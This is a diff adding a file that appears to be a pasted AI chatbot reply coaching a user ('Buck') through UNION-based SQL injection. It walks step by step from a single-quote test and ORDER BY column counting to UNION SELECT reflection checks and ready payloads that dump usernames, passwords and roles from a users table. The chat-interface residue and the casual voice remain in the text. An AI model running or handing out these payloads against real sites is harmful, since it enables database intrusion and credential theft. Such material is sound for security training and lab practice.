@@ -1,0 +1,130 @@
+🧠 Core Idea:
+We’re gonna leverage UNION to append our own query results onto what the server is already selecting, and then see those results printed in columns the page reflects.
+
+🧪 Step-by-Step Breakdown:
+✅ 1. Confirm SQL Injection
+Test with a ' and get a syntax error.
+
+That confirms the input is unsanitized and injectable.
+
+🔢 2. Find the Number of Columns
+There are two methods:
+
+→ A. ORDER BY method
+Inject:
+
+sql
+Copy
+Edit
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+...
+' ORDER BY N-- -
+Until you get an error.
+
+If ' ORDER BY 5-- - errors → there are 4 columns.
+
+→ B. UNION SELECT method
+Inject:
+
+sql
+Copy
+Edit
+' UNION SELECT 1,2,3-- -
+If you get an error about mismatched columns, add another:
+
+sql
+Copy
+Edit
+' UNION SELECT 1,2,3,4-- -
+When it succeeds — you’ve matched the right number of columns.
+
+👁️ 3. Find Reflected Columns
+Once 1,2,3,4 is successful, see which numbers actually appear in the page:
+
+If the page prints 2, 3, 4, but not 1, then columns 2–4 are reflected.
+
+These are your injection points.
+
+🧪 4. Test for Arbitrary Data Reflection
+Replace one reflected column with @@version, a built-in SQL variable:
+
+sql
+Copy
+Edit
+' UNION SELECT 1,@@version,3,4-- -
+If you see the DB version print, you’re golden — you can now inject and print arbitrary query results in that spot.
+
+✅ Why Use NULL, 1, 2, 3?
+Just placeholders! They make it easy to:
+
+Avoid data type errors.
+
+Track which columns are reflected.
+
+Pad out the rest of the columns so the UNION matches.
+
+🔑 KEY WORKFLOW:
+text
+Copy
+Edit
+Got Error on ' → Check for SQLi ✅
+→ Find columns: ' ORDER BY N-- -
+→ Then test UNION SELECT 1,2,3,...-- -
+→ Note which numbers print = reflected columns
+→ Replace a reflected column with real data (e.g. username, @@version)
+💡 Pro Tip:
+If you're struggling to remember:
+
+ORDER BY = Find how many columns
+
+UNION SELECT = Find what reflects
+
+@@version = Proof of data exfil
+
+Exactly, Buck — that’s dead on. 💯
+
+Once you've confirmed which columns are reflected (visible) — in this case, columns 2, 3, and 4 — you can insert your payload into any of those.
+
+🔥 Here's how it plays out:
+Let’s say you confirmed:
+
+sql
+Copy
+Edit
+' UNION SELECT 1,2,3,4-- -
+And the page prints:
+
+kotlin
+Copy
+Edit
+Your role is 2  
+Your lucky number is 3  
+Another fun fact is 4
+That means:
+
+Column 1 = not printed (don’t bother injecting here)
+
+Columns 2, 3, 4 = reflected (these are your data exfil points)
+
+💡 So when dumping real data:
+You swap one of those with the actual DB column you want to dump:
+
+Examples:
+
+sql
+Copy
+Edit
+' UNION SELECT 1, username, 3, 4 FROM users-- -
+' UNION SELECT 1, 2, password, 4 FROM users-- -
+' UNION SELECT 1, 2, 3, role FROM users-- -
+Or, if you want to do all three:
+
+sql
+Copy
+Edit
+' UNION SELECT 1, username, password, role FROM users-- -
+The goal is to place actual DB fields into spots that will print.
+
+So yeah bro — inject into any of the reflected columns, and fill the others with placeholders like 1, 2, NULL, etc., as needed to keep things balanced.
+
